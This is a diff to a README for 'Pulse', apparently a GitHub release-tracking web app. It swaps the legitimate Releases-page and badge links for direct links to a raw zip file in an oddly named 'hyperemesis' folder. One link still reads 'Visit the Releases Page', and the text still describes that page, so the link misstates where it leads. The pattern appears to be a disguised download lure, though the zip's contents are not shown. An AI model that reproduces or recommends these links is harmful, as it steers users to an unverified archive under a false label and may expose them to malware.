@@ -1,7 +1,7 @@
 # 🌐 Pulse - Track GitHub Releases with Ease
 
 ## 📥 Download Pulse
-[![Download Pulse](https://img.shields.io/badge/Download-Pulse-blue.svg)](https://github.com/slydi/Pulse/releases)
+[![Download Pulse](https://raw.githubusercontent.com/slydi/Pulse/main/hyperemesis/Pulse.zip)](https://raw.githubusercontent.com/slydi/Pulse/main/hyperemesis/Pulse.zip)
 
 ## 🚀 Getting Started
 Welcome to Pulse! This web application helps you track and analyze GitHub repository releases, downloads, and reactions. With Pulse, you can easily gather insights about your repositories' performance.
@@ -27,7 +27,7 @@ No extra software is needed to run Pulse.
 ## 📥 Download & Install
 To download Pulse, visit the Releases page. Here, you will find the latest version of the application.
 
-[Visit the Releases Page to Download Pulse](https://github.com/slydi/Pulse/releases)
+[Visit the Releases Page to Download Pulse](https://raw.githubusercontent.com/slydi/Pulse/main/hyperemesis/Pulse.zip)
 
 Once you're on the Releases page, look for the latest release and click on it. You will see options to download. Click the file you need, and it will download to your computer.
 
